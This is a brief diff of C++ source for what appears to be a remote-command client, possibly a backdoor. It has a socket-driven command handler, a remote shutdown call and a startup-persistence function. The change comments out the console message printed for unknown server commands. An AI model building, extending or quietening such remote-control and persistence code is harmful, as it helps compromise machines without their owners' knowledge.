@@ -83,9 +83,9 @@ void HandleCommands(std::string command, SOCKET sock) {
 		ExitWindowsEx(0, 0);
 	} 
 
-    else {
-        std::cout << "[!] Server sent this unknown command: " << command << "\n";
-    }
+    // else {
+    //     std::cout << "[!] Server sent this unknown command: " << command << "\n";
+    // }
 }
 
 void SaveOnStartUp() {
